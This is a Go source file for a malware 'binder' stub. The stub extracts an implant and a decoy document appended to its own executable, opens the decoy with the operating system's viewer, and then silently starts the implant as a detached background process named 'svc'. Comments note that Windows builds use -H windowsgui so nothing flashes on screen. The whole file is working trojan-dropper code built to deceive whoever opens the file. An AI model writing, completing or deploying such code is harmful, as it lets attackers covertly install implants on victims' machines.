// Phantom binder stub.
//
// One executable carries two blobs after its own image:
//
//	[stub image][implant][decoy document][document name][footer]
//
// On launch it drops the decoy to a temp dir, opens it with the OS handler and
// then starts the implant detached. Windows builds use -H windowsgui so nothing
// flashes on screen.
package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

var magic = []byte("PHNTBINDv1______")

const footerSize = 36 // implantLen(4) docLen(4) nameLen(4) flags(4) pad(4) magic(16)

func debugf(format string, a ...interface{}) {
	if os.Getenv("PHANTOM_DEBUG") == "" {
		return
	}
	fmt.Fprintf(os.Stderr, "[stub] "+format+"\n", a...)
}

func main() {
	self, err := os.Executable()
	if err != nil {
		return
	}
	blob, err := os.ReadFile(self)
	if err != nil || len(blob) < footerSize+2048 {
		debugf("short/read error: %v len=%d", err, len(blob))
		return
	}

	f := blob[len(blob)-footerSize:]
	if !bytes.Equal(f[20:36], magic) {
		debugf("no magic")
		return
	}
	implantLen := int(binary.LittleEndian.Uint32(f[0:4]))
	docLen := int(binary.LittleEndian.Uint32(f[4:8]))
	nameLen := int(binary.LittleEndian.Uint32(f[8:12]))
	flags := binary.LittleEndian.Uint32(f[12:16])

	nameOff := len(blob) - footerSize - nameLen
	docOff := nameOff - docLen
	impOff := docOff - implantLen
	if impOff < 0 || nameOff < 0 || docOff < 0 {
		debugf("bad offsets imp=%d doc=%d name=%d", implantLen, docLen, nameLen)
		return
	}

	if nameOff+nameLen > len(blob) {
		debugf("name overflow")
		return
	}
	name := sanitize(string(blob[nameOff : nameOff+nameLen]))
	doc := blob[docOff:nameOff]
	imp := blob[impOff:docOff]
	debugf("doc=%s (%d bytes) implant=%d bytes", name, docLen, implantLen)

	dir, err := os.MkdirTemp("", "cache")
	if err != nil {
		debugf("mkdtemp: %v", err)
		return
	}
	debugf("workdir=%s", dir)

	if docLen > 0 {
		docPath := filepath.Join(dir, name)
		if err := os.WriteFile(docPath, doc, 0644); err == nil {
			debugf("opening decoy")
			openPath(docPath)
			if flags&1 == 1 {
				time.Sleep(1500 * time.Millisecond) // let the viewer come up first
			}
		} else {
			debugf("write decoy: %v", err)
		}
	}

	runImplant(imp, dir)
}

func sanitize(n string) string {
	n = strings.TrimSpace(n)
	n = strings.ReplaceAll(n, "/", "_")
	n = strings.ReplaceAll(n, "\\", "_")
	n = strings.ReplaceAll(n, ":", "_")
	if n == "" || n == "." || n == ".." {
		n = "document.pdf"
	}
	return n
}

func openPath(p string) {
	switch runtime.GOOS {
	case "windows":
		if err := start("cmd", "/c", "start", "", p); err == nil {
			return
		}
		start("rundll32", "url.dll,FileProtocolHandler", p)
	case "darwin":
		start("open", p)
	default:
		for _, opener := range [][]string{
			{"xdg-open", p},
			{"gio", "open", p},
			{"kde-open5", p},
			{"kde-open", p},
		} {
			if err := start(opener[0], opener[1:]...); err == nil {
				return
			}
		}
	}
}

func start(name string, args ...string) error {
	c := exec.Command(name, args...)
	detach(c)
	return c.Start()
}

func runImplant(blob []byte, dir string) {
	if len(blob) == 0 {
		return
	}
	name := "svc"
	if runtime.GOOS == "windows" {
		name = "svc.exe"
	}
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, blob, 0755); err != nil {
		debugf("write implant: %v", err)
		return
	}
	_ = os.Chmod(p, 0755)
	c := exec.Command(p)
	detach(c)
	c.Dir = dir
	if err := c.Start(); err != nil {
		debugf("start implant: %v", err)
		return
	}
	debugf("implant started")
	// the stub can exit, the implant keeps running detached
	if runtime.GOOS != "windows" {
		time.Sleep(200 * time.Millisecond)
	}
}
